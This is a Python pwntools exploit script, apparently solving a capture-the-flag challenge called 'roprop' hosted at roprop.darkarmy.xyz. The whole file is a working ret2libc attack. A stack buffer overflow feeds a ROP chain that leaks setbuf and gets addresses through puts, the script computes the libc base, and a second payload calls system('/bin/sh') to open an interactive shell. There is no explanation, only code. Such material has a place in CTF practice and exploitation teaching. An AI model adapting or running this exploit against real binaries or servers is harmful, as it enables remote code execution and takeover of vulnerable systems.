from pwn import *
local = 0
if local:
    s = process("./roprop")
    raw_input('debug')
    context.log_level = "debug"
else:
    s = remote("roprop.darkarmy.xyz", 5002)
    
# todo
'''
leak libc (*_got, puts_plt, pop rdi)
call system (base, system, binsh)
'''
pop_rdi = 0x0000000000400963
gets_got = 0x601038
printf_got = 0x601020
puts_got = 0x601018
setbuf_got = 0x601040
signal_got = 0x601030
puts_plt = 0x400660
main = 0x4008b2
offset2overflow = 0x58
payload = 'a'*offset2overflow 
payload+= p64(pop_rdi) + p64(setbuf_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(gets_got) + p64(puts_plt)
payload += p64(main)
s.sendlineafter("He have got something for you since late 19's.\n",payload)
s.recvuntil("\x0a")
setbuf = u64(s.recv(6)+'\x00'*2)
s.recvuntil("\x0a")
gets = u64(s.recv(6)+'\x00'*2)
log.info("setbuf: 0x%x"%setbuf)
log.info("gets: 0x%x"%gets)

# ====================== exxploit ===============
system_off = 0x04f4e0
gets_off = 0x080120
binsh_off = 0x1b40fa
base = gets - gets_off
system = base + system_off
binsh = base + binsh_off
log.info("base: 0x%x"%base)
exp = 'a'*offset2overflow + p64(pop_rdi) + p64(binsh) + p64(system)
s.sendlineafter("He have got something for you since late 19's.\n",exp)
s.interactive()
s.close()